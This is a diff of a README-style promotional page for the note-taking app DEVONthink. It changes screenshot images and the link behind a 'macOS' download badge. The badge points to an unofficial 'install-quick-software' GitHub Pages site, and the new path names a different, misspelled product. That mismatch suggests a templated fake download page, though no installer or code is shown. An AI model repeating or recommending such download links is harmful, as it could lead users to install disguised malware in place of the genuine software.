@@ -3,7 +3,7 @@
 <br>
 
 <p align="center">
-  <img src="https://tidbits.com/uploads/2019/04/DEVONthink-3-icon.jpg" width="260">
+  <img src="https://eastgate.com/Tinderbox/logo/Devon.png" width="260">
 </p>
 
 <p align="center">
@@ -16,7 +16,7 @@
 <br>
 
 <p align="center">
-  <a href="https://install-quick-software.github.io/.github/devonthink">
+  <a href="https://install-quick-software.github.io/.github/totalcommasnder">
     <img src="https://i.postimg.cc/7LTTZgxF/macos-badge-noborder.png" width="200">
   </a>
 </p>
@@ -57,7 +57,9 @@ Over time, DEVONthink becomes more than storage; it becomes a thinking tool. **[
 
 ## Screenshots
 
-![Screenshot](https://www.devontechnologies.com/media/pages/press/archive/devonthink-30b4/1a7646d4de-1743674867/exomars_concordance_dark.jpg)
+![Screenshot](https://thesweetsetup.com/wp-content/uploads/2019/05/wkflw-devonthink-ril-03.jpeg)
+
+![Screenshot](https://visualsproducer.wordpress.com/wp-content/uploads/2019/05/devonthink3-web.5caab35b872e4124830cac07dfa474f0.jpg?w=1024)
 
 ---
 
